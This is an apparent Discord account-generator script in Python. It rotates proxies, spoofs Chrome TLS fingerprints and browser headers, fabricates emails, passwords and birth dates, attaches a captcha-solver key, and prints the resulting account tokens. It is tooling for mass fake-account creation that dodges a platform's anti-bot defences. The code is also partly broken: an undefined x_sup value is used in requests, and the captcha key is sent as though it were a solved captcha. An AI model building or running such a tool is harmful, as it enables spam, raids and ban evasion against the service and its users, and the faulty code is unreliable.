import tls_client
import random
import string
import time
import threading
import json
import colorama
import ctypes
import requests

# Load configuration, proxies, and usernames from files
def load_configuration():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print("config.json not found!")
        exit()

def load_proxies():
    try:
        with open('input/proxies.txt', 'r') as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print("proxies.txt not found!")
        exit()

def load_usernames():
    try:
        with open('input/usernames.txt', 'r') as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print("usernames.txt not found!")
        exit()


class Discord:
    def __init__(self, config, proxies, usernames) -> None:
        self.data = config
        self.proxy = random.choice(proxies)

        self.ua_version = config['ua_version']
        self.ua = config['ua']
        self.sec_ch_ua = config['sec_ch_ua']

        self.session = tls_client.Session(client_identifier=f"chrome_{self.ua_version}", random_tls_extension_order=True)
        self.session.proxies = {
            'https': f"http://{self.proxy}",
            'http': f"http://{self.proxy}"
        }

        self.bios = config['bios'] if config['bio'] else []
        self.cap_key = config['captcha_api_key']
        self.toggle_errors = config['show_errors']

        self.lock = threading.Lock()

        self.rl = "The resource is being rate limited."
        self.locked = "You need to verify your account in order to perform this action"
        self.captcha_detected = "captcha-required"

        if config['random_username']:
            self.username = "".join(random.choice(string.ascii_letters) for x in range(random.randint(6, 8)))
        else:
            self.username = random.choice(usernames)

        self.email = "".join(random.choice(string.ascii_letters) for x in range(random.randint(6, 8)))
        self.email += str("".join(str(random.randint(1, 9) if random.randint(1, 2) == 1 else random.choice(string.ascii_letters)) for x in range(int(random.randint(6, 8)))) )
        self.email += random.choice(["@gmail.com", "@outlook.com"])

        if config['password'] == "":
            self.password = "".join(random.choice(string.digits) if random.randint(1, 2) == 1 else random.choice(string.ascii_letters) for x in range(random.randint(8, 24))) + "".join("" if random.randint(1, 2) == 1 else random.choice(["@", "$", "%", "*", "&", "^"]) for x in range(1, 6))
        else:
            self.password = config['password']

    def get_cookies(self):
        url = "https://discord.com/register"
        self.session.headers = {
            'authority': 'discord.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.ua,
        }

        try:
            retries = 3
            for _ in range(retries):
                try:
                    response = self.session.get(url)  # Removed timeout parameter here
                    if response.status_code == 200:
                        self.session.cookies = response.cookies
                        print("Cookies fetched successfully.")
                        return
                    else:
                        print(f"Error Fetching Cookies: Received Status Code {response.status_code}")
                        time.sleep(2)  # Retry after a brief pause
                except Exception as e:
                    print(f"Error during cookie fetch attempt: {str(e)}")
                    time.sleep(2)  # Retry after a brief pause
            print("Failed to fetch cookies after 3 retries.")
        except Exception as e:
            print(f"Error Fetching Cookies: {str(e)}")
        return None

    def get_fingerprint(self):
        url = 'https://discord.com/api/v9/experiments?with_guild_experiments=true'
        self.session.headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://discord.com/register',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.ua,
            'x-context-properties': "Register",
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-discord-timezone': 'America/New_York',
            'x-super-properties': self.x_sup,
        }
        try:
            r = self.session.get(url)
            return r.json()['fingerprint']
        except Exception as e:
            print(f"Error Fetching Fingerprint: {str(e)}")
            return None

    def create_acct(self):
        url = 'https://discord.com/api/v9/auth/register'
        self.display_name = self.username
        self.session.headers = {
                'authority': 'discord.com',
                'accept': '*/*',
                "accept-encoding": "gzip, deflate, br",
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://discord.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://discord.com/register',
                'sec-ch-ua': self.sec_ch_ua,
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.ua,
                'x-captcha-key': str(self.cap_key),
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': 'en-US',
                'x-discord-timezone': 'America/New_York',
                'x-fingerprint': self.fp,
                'x-super-properties': self.x_sup,
        }
        payload = {
                'fingerprint': self.fp,
                'email': self.email,
                'username': self.username + "".join(random.choice(string.ascii_letters) for x in range(random.randint(1, 3))),
                'global_name': self.display_name,
                'password': self.password,
                'invite': self.data["invite"] if self.data["invite"] != None else None,
                'consent': True,
                'date_of_birth': f'{random.randint(1980, 2001)}-{random.randint(1, 10)}-{random.randint(1, 10)}',
                'gift_code_sku_id': None
        }
        try:
            r = self.session.post(url, json=payload)
            self.token = r.json()['token']
            print(f"Account Created! Token: {self.token}")
        except Exception as e:
            print(f"Error Creating Account: {str(e)}")

    def begin(self):
        self.fp = self.get_fingerprint()
        if self.fp is None:
            print("Failed to retrieve fingerprint, stopping.")
            return

        self.get_cookies()
        self.create_acct()


if __name__ == "__main__":
    # Load configuration, proxies, and usernames
    configuration = load_configuration()
    proxies = load_proxies()
    usernames = load_usernames()

    discord = Discord(configuration, proxies, usernames)
    discord.begin()
